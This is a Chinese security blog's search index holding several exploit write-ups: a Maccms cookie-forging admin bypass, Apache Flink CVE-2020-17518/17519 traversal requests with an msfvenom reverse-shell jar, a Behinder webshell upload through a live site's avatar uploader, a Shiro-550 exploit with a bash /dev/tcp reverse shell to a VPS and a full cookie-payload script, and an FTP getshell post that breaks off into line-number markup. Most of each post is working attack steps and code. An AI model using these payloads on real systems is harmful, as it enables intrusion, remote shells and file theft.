<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>苹果CMS未授权登录审计复现</title>
      <link href="2021/01/19/%E8%8B%B9%E6%9E%9CCMS%E6%9C%AA%E6%8E%88%E6%9D%83%E7%99%BB%E5%BD%95%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%8E%B0/"/>
      <url>2021/01/19/%E8%8B%B9%E6%9E%9CCMS%E6%9C%AA%E6%8E%88%E6%9D%83%E7%99%BB%E5%BD%95%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h1><p>苹果CMS爱好者平台由多个资深站长自由组建的,是以影视系统,漫画系统,小说系统,写真系统,教育系统等内容系统为主的交流学习平台,平台开放后深受众多站长们的喜爱</p><p>后台登录校验不严格，导致未授权登录后台</p><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>首先直接访问</p><p><a href="http://www.mm.com/admin.php/admin/index/index.html">www.mm.com/admin.php/admin/index/index.html</a></p><p>根据thinkphp框架特性POC为</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin_id=think:[&quot;like&quot;,&quot;%&quot;]; admin_name=think:[&quot;like&quot;,&quot;%&quot;]; admin_check=think:true</span><br></pre></td></tr></table></figure><p>抓包，修改cookie中的内容</p><p><img src="/2021/01/19/%E8%8B%B9%E6%9E%9CCMS%E6%9C%AA%E6%8E%88%E6%9D%83%E7%99%BB%E5%BD%95%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%8E%B0/1.png"></p><p><a href="http://www.mm.com/admin.php/admin/index/welcome.html">http://www.mm.com/admin.php/admin/index/welcome.html</a></p><p><img src="/2021/01/19/%E8%8B%B9%E6%9E%9CCMS%E6%9C%AA%E6%8E%88%E6%9D%83%E7%99%BB%E5%BD%95%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%8E%B0/2.png"></p><p><img src="/2021/01/19/%E8%8B%B9%E6%9E%9CCMS%E6%9C%AA%E6%8E%88%E6%9D%83%E7%99%BB%E5%BD%95%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%8E%B0/3.png"></p><p>cookie设置一下全局变量，就不用每次抓包加cookie</p><p><img src="/2021/01/19/%E8%8B%B9%E6%9E%9CCMS%E6%9C%AA%E6%8E%88%E6%9D%83%E7%99%BB%E5%BD%95%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%8E%B0/4.png"></p><h1 id="漏洞审计"><a href="#漏洞审计" class="headerlink" title="漏洞审计"></a>漏洞审计</h1><p>漏洞所在文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\application\common\model\Admin.php</span><br></pre></td></tr></table></figure><p>漏洞文件代码：(只贴上相关代码)</p><p><img src="/2021/01/19/%E8%8B%B9%E6%9E%9CCMS%E6%9C%AA%E6%8E%88%E6%9D%83%E7%99%BB%E5%BD%95%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%8E%B0/5.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">第149-151行当账号密码正确的时候，会将登录信息存储到cookie中</span><br></pre></td></tr></table></figure><p><img src="/2021/01/19/%E8%8B%B9%E6%9E%9CCMS%E6%9C%AA%E6%8E%88%E6%9D%83%E7%99%BB%E5%BD%95%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%8E%B0/6.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">第167-169行，接收Cookie中的三个变量的值</span><br><span class="line">第176-178行，将接收到的三个值存储到<span class="variable">$where</span>这个数组中</span><br><span class="line">第180行，将<span class="variable">$where</span>中的数据在数据库中进行查询，当查询到将可以登录，上面利用了cookie获取登录验证的，我们可以利用thinkphp的特性将cookie中的值设置为模糊查询的，这样就相当于利用了账号密码登录</span><br><span class="line">第181行，<span class="keyword">if</span>(empty(<span class="variable">$info</span>))判断查询数据中是否为空，不为空就继续执行代码</span><br><span class="line">第187行，因为我们传admin_check=think:<span class="literal">true</span>，所以 <span class="keyword">if</span>(<span class="variable">$login_check</span> != <span class="variable">$admin_check</span>)，肯定会不成立，最后登录成功</span><br></pre></td></tr></table></figure><h1 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h1><p>1.可以将登录信息记录到session中，验证登录从session中判断，从而达到不能伪造的cookie登录的目的</p><p>比如</p><p><img src="/2021/01/19/%E8%8B%B9%E6%9E%9CCMS%E6%9C%AA%E6%8E%88%E6%9D%83%E7%99%BB%E5%BD%95%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%8E%B0/7.png"></p><p>2.升级到最新版本</p><p><strong>本文仅作于漏洞研究，禁止用于非法用途</strong></p><p><strong>造成一切后果，与作者无关</strong></p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Apache Flink CVE-2020-17519/17518 漏洞复现</title>
      <link href="2021/01/19/Apache-Flink-CVE-2020-17519-17518-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>2021/01/19/Apache-Flink-CVE-2020-17519-17518-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="FOFA"><a href="#FOFA" class="headerlink" title="FOFA"></a>FOFA</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app=<span class="string">&quot;APACHE-Flink&quot;</span></span><br></pre></td></tr></table></figure><h1 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h1><p>Apache Flink是由Apache软件基金会开发的开源流处理框架，其核心是用Java和Scala编写的分布式流数据流引擎。在Apache Flink 1.5.1版本中引入了REST API</p><h1 id="CVE-2020-17518-文件写入漏洞"><a href="#CVE-2020-17518-文件写入漏洞" class="headerlink" title="CVE-2020-17518: 文件写入漏洞"></a>CVE-2020-17518: 文件写入漏洞</h1><p>攻击者利用REST API，可以修改HTTP头，将上传的文件写入到本地文件系统上的任意位置（Flink 1.5.1进程能访问到的）</p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST http://ip:8081/jars/upload HTTP/1.1</span><br><span class="line">Host: ip:8081</span><br><span class="line">Content-Length: 245</span><br><span class="line">Accept: application/json, text/plain, */*</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundarywk4sMP1TfX46mdWZ</span><br><span class="line">Origin: http://ip:8081</span><br><span class="line">Referer: http://ip:8081/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,en-US;q=0.7,en;q=0.6</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundarywk4sMP1TfX46mdWZ</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;jarfile&quot;</span>; filename=<span class="string">&quot;../../../../../../../tmp/hello&quot;</span></span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line"></span><br><span class="line">hello</span><br></pre></td></tr></table></figure><p><img src="/2021/01/19/Apache-Flink-CVE-2020-17519-17518-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1.png"></p><p>URL：</p><p><a href="http://ip:8081/jobmanager/logs/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2ftmp%2fhello">http://ip:8081/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252ftmp%252fhello</a></p><p>估计是设置了禁止执行脚本，%252f为/的两次url编码</p><p><img src="/2021/01/19/Apache-Flink-CVE-2020-17519-17518-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/2.png"></p><p><img src="/2021/01/19/Apache-Flink-CVE-2020-17519-17518-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/3.png"></p><h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>flink 本身是没有鉴权的，并且它本身支持任意jar包上传并执行，所以可以通过上传jar包getshell</p><p>Msf生成jar格式的马</p><p>lhost为VPS的ip，lport为VPS接收shell的端口</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/shell_reverse_tcp lhost=ip lport=1116 -f jar &gt;/root/123.jar</span><br></pre></td></tr></table></figure><p><img src="/2021/01/19/Apache-Flink-CVE-2020-17519-17518-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/4.png"></p><p><img src="/2021/01/19/Apache-Flink-CVE-2020-17519-17518-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/5.png"></p><p><img src="/2021/01/19/Apache-Flink-CVE-2020-17519-17518-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/6.png"></p><h1 id="CVE-2020-17519-文件读取漏洞"><a href="#CVE-2020-17519-文件读取漏洞" class="headerlink" title="CVE-2020-17519: 文件读取漏洞"></a>CVE-2020-17519: 文件读取漏洞</h1><p>Apache Flink 1.11.0 允许攻击者通过JobManager进程的REST API读取JobManager本地文件系统上的任何文件（JobManager进程能访问到的）</p><p><strong>POC</strong></p><p><a href="http://IP:PORT/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd">http://IP:PORT/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd</a></p><p><img src="/2021/01/19/Apache-Flink-CVE-2020-17519-17518-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/7.png"></p><h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1><p>官方已发布安全版本，请及时下载升级至安全版本</p><p><a href="https://flink.apache.org/zh/downloads.html">https://flink.apache.org/zh/downloads.html</a></p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://www.anquanke.com/post/id/227668">https://www.anquanke.com/post/id/227668</a></p><p><a href="https://mp.weixin.qq.com/s/zBmxTEQsZsJWKS_hFZNUMA">https://mp.weixin.qq.com/s/zBmxTEQsZsJWKS_hFZNUMA</a></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基于flash的上传</title>
      <link href="2020/11/27/%E5%9F%BA%E4%BA%8Eflash%E7%9A%84%E4%B8%8A%E4%BC%A0/"/>
      <url>2020/11/27/%E5%9F%BA%E4%BA%8Eflash%E7%9A%84%E4%B8%8A%E4%BC%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在一次渗透过程中所碰到的上传，一开始以为没搞头了，谁知最后柳暗花明又一村</p><p><img src="/2020/11/27/%E5%9F%BA%E4%BA%8Eflash%E7%9A%84%E4%B8%8A%E4%BC%A0/1.png"></p><p>在这次测试中也踩了一点坑，有时候上传点可能是基于flash的，需要将flash开启才能够正常上传。之前有一次在测试上传点的时候用的火狐浏览器，它也没如下图的提示</p><p><img src="/2020/11/27/%E5%9F%BA%E4%BA%8Eflash%E7%9A%84%E4%B8%8A%E4%BC%A0/2.png"></p><p>因为之前测的那个站点没有开启flash也是能够正常上传图片的，但是传不了马子。当我将浏览器换成谷歌浏览器，它就提示了，我将flash开启之后，直接改后缀传马子，立马拿shell</p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>在打开测试站点的时候，谷歌浏览器就提示</p><p><img src="/2020/11/27/%E5%9F%BA%E4%BA%8Eflash%E7%9A%84%E4%B8%8A%E4%BC%A0/3.png"></p><p>假如没开启的话是一片空白的</p><p><img src="/2020/11/27/%E5%9F%BA%E4%BA%8Eflash%E7%9A%84%E4%B8%8A%E4%BC%A0/4.png"></p><p>将flash开启之后，如下图，说实话在测上传的时候有点讨厌碰到这种类型的上传，在上传的时候会切割图片，你所制作的图片马也可能因此失效</p><p><img src="/2020/11/27/%E5%9F%BA%E4%BA%8Eflash%E7%9A%84%E4%B8%8A%E4%BC%A0/5.png"></p><p>话不多说，先直接上图片测试看看能不能上传，当看到这个我有点看傻了，这什么加密，aes加密吗？</p><p><img src="/2020/11/27/%E5%9F%BA%E4%BA%8Eflash%E7%9A%84%E4%B8%8A%E4%BC%A0/6.png"></p><p>哎，心想既然都弄到这里了，改个上传后缀看看吧</p><p>结果还真中奖了，500报错，说明这个点是可以进行上传的</p><p>麻烦的是，不知道怎么将马子加进去，因为图片是经过切割的，所以图片马也就没有起到作用</p><p><img src="/2020/11/27/%E5%9F%BA%E4%BA%8Eflash%E7%9A%84%E4%B8%8A%E4%BC%A0/7.png"></p><p>期间，我尝试翻看html源码，在看js的时候看的脑壳疼(没学过js)，看来看去也没看出一个所以然来。只能在那里瞎几把乱试了，最后可能是老天看我可怜，给我试了出来，看来是一开始想复杂了</p><p><img src="/2020/11/27/%E5%9F%BA%E4%BA%8Eflash%E7%9A%84%E4%B8%8A%E4%BC%A0/8.png"></p><p>只要将马子用base64编码替换图片的内容即可getshell</p><p>首先，将冰蝎马编码成base64的</p><p><img src="/2020/11/27/%E5%9F%BA%E4%BA%8Eflash%E7%9A%84%E4%B8%8A%E4%BC%A0/9.png"></p><p>middle_avatar、big_avatar及little_avatar，都是图片中的内容，所以这3个都要替换成base64后的冰蝎马</p><p><img src="/2020/11/27/%E5%9F%BA%E4%BA%8Eflash%E7%9A%84%E4%B8%8A%E4%BC%A0/10.png"></p><p>将后缀修改为jsp之后，发包即可，最后在头像处拿到shell的地址</p><p><img src="/2020/11/27/%E5%9F%BA%E4%BA%8Eflash%E7%9A%84%E4%B8%8A%E4%BC%A0/11.png"></p><p>至此，就结束啦!</p><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>在进行渗透的时候，多尝试，万一一不小心就拿下了呢？这个站头像有可能是使用了base64进行传输，最后因为某些原因没有来得及看源码</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Shiro 550复现</title>
      <link href="2020/08/19/Shiro-550%E5%A4%8D%E7%8E%B0/"/>
      <url>2020/08/19/Shiro-550%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Apache Shiro是一款开源安全框架，提供身份验证、授权、密码学和会话管理。Shiro框架直观、易用，同时也能提供健壮的安全性。</p><h1 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h1><p><strong>Apache Shiro &lt;= 1.2.4</strong></p><h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><p>Apache Shiro 1.2.4及以前版本中，Apache Shiro默认使用了CookieRememberMeManager，其处理cookie的流程是：得到rememberMe的cookie值 &gt; Base64解码–&gt;AES解密–&gt;反序列化。然而AES的密钥是硬编码的，就导致了攻击者可以构造恶意数据造成反序列化的RCE漏洞</p><h1 id="漏洞特征"><a href="#漏洞特征" class="headerlink" title="漏洞特征"></a>漏洞特征</h1><p>shiro反序列化的特征：在返回包的 Set-Cookie 中存在rememberMe=deleteMe 字段</p><p><img src="/2020/08/19/Shiro-550%E5%A4%8D%E7%8E%B0/1.png"></p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">获取docker镜像</span><br><span class="line">docker pull medicean/vulapps:s_shiro_1</span><br><span class="line">启动docker镜像：</span><br><span class="line">docker run -d -p 8080:8080 medicean/vulapps:s_shiro_1</span><br></pre></td></tr></table></figure><h2 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><p><strong>存在</strong> <strong>Set-Cookie</strong> <strong>利用</strong> <strong>Shiro_exploit</strong> <strong>脚本检测一下是否存在默认key</strong></p><p><strong>python2 shiro.py -u <a href="http://xxx.xxx.xxx.xxx/login.jsp">http://xxx.xxx.xxx.xxx/login.jsp</a></strong></p><p><img src="/2020/08/19/Shiro-550%E5%A4%8D%E7%8E%B0/2.png"></p><h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>VPS监听:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 1234</span><br></pre></td></tr></table></figure><p><strong>随后在vps，执行如下命令：（注意这里监听的端口为1099）</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 <span class="string">&#x27;命令&#x27;</span></span><br></pre></td></tr></table></figure><p><strong>这里的命令需要使用Java Runtime配置bash编码</strong></p><p><strong>在线编码转换地址：<a href="http://www.jackson-t.ca/runtime-exec-payloads.html">http://www.jackson-t.ca/runtime-exec-payloads.html</a></strong></p><p><strong>转换命令如下：（这里是反弹shell的端口为1234）</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/VPS公网ip/1234 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p><img src="/2020/08/19/Shiro-550%E5%A4%8D%E7%8E%B0/4.png"></p><p><strong>最终在VPS上执行的命令如下</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections4 <span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8zOS45Ny4xMDAuMjcvMTIzNCAwPiYxCgo=&#125; | &#123;base64 -d&#125; | &#123;bash,-i&#125;</span></span><br></pre></td></tr></table></figure><p>使用exp.py 生成Payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> Random</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode_rememberme</span>(<span class="params">command</span>):</span></span><br><span class="line">    popen = subprocess.Popen([<span class="string">&#x27;java&#x27;</span>, <span class="string">&#x27;-jar&#x27;</span>, <span class="string">&#x27;ysoserial-0.0.5-SNAPSHOT-all.jar&#x27;</span>, <span class="string">&#x27;CommonsCollections2&#x27;</span>, command], stdout=subprocess.PIPE)</span><br><span class="line">    BS   = AES.block_size</span><br><span class="line">    pad = <span class="keyword">lambda</span> s: s + ((BS - <span class="built_in">len</span>(s) % BS) * <span class="built_in">chr</span>(BS - <span class="built_in">len</span>(s) % BS)).encode()</span><br><span class="line">    key  =  <span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span></span><br><span class="line">    mode =  AES.MODE_CBC</span><br><span class="line">    iv   =  uuid.uuid4().<span class="built_in">bytes</span></span><br><span class="line">    encryptor = AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line">    file_body = pad(popen.stdout.read())</span><br><span class="line">    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line">    <span class="keyword">return</span> base64_ciphertext</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    payload = encode_rememberme(sys.argv[<span class="number">1</span>])    </span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;/tmp/payload.cookie&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> fpw:</span><br><span class="line">        print(<span class="string">&quot;rememberMe=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(payload.decode()), file=fpw)</span><br></pre></td></tr></table></figure><p>把生成的payload复制下来，粘贴到cookie后面</p><p><img src="/2020/08/19/Shiro-550%E5%A4%8D%E7%8E%B0/6.png"></p><p>发包即可，查看VPS上的结果</p><p><img src="/2020/08/19/Shiro-550%E5%A4%8D%E7%8E%B0/7.png"></p><p><img src="/2020/08/19/Shiro-550%E5%A4%8D%E7%8E%B0/8.png"></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记一次内网渗透</title>
      <link href="2020/08/10/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
      <url>2020/08/10/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>首先，这个站点有一个前台getshell的漏洞</p><p><img src="/2020/08/10/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/1.png"></p><p><img src="/2020/08/10/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/2.png"></p><p>根据里面漏洞代码直接取post数据后缀作为后缀这一特性，且CMS支持FTP。</p><p>利用FTP上传图片，通过下载上传的正常图片（已被PHP的GD库渲染）之后，</p><p>利用脚本在图片中插入payload，</p><p>再次利用FTP上传达到GET Shell的目的</p><p>payload如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST /index.php?<span class="keyword">case</span>=tool&amp;act=cut_image </span><br><span class="line">pic=1ftp://*.*.*.*/shell.php&amp;w=228&amp;h=146&amp;x1=0&amp;x2=228&amp;y1=0&amp;y2=146</span><br></pre></td></tr></table></figure><h1 id="搭建FTP服务器"><a href="#搭建FTP服务器" class="headerlink" title="搭建FTP服务器"></a>搭建FTP服务器</h1><p>我这里使用ubantu进行搭建</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">安装VSFTPD</span><br><span class="line">sudo apt-get install vsftpd</span><br><span class="line">安装完成后启动VSFTPD服务</span><br><span class="line">service vsftpd start</span><br><span class="line">新建目录/home/uftp作为用户主目录</span><br><span class="line">sudo mkdir /home/uftp，最后我搭建完，主目录不是这里，/srv/ftp，这个才是 新建用户uftp，制定用户主目录和所用shell，并设置密码</span><br><span class="line">sudo useradd -d /home/uftp -s /bin/bash uftp</span><br><span class="line">sudo passwd uftp</span><br><span class="line">然后将目录/home/uftp的所属者和所属组都改为uftp</span><br><span class="line">sudo chown uftp:uftp /home/uftp</span><br><span class="line">新建文件/etc/vsftpd.user_list，用于存放允许访问ftp的用户</span><br><span class="line">sudo vim /etc/vsftpd.user_list，添加用户uftp</span><br><span class="line">最后设置匿名访问</span><br><span class="line">vim /etc/vsftpd.conf</span><br><span class="line">write_enable=YES</span><br><span class="line">anonymous_enable=YES</span><br><span class="line">anon_upload_enable=YES</span><br><span class="line">anon_other_write_enable=YES</span><br><span class="line">anon_world_readable_only=NO</span><br><span class="line">重启vsftpd服务，假如不行则设置相应的权限</span><br></pre></td></tr></table></figure><h1 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h1><p>步骤：</p><ol><li><p>将一张比较大的图片上传到ftp</p></li><li><p>利用上述POC，将图片上传到目标服务器，上传成功之后再将图片保存下来</p></li><li><pre><code class="bash">/index.php?case=tool&amp;act=cut_image pic=1ftp://*.*.*.*/*.jpg&amp;w=228&amp;h=146&amp;x1=0&amp;x2=228&amp;y1=0&amp;y2=146<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span 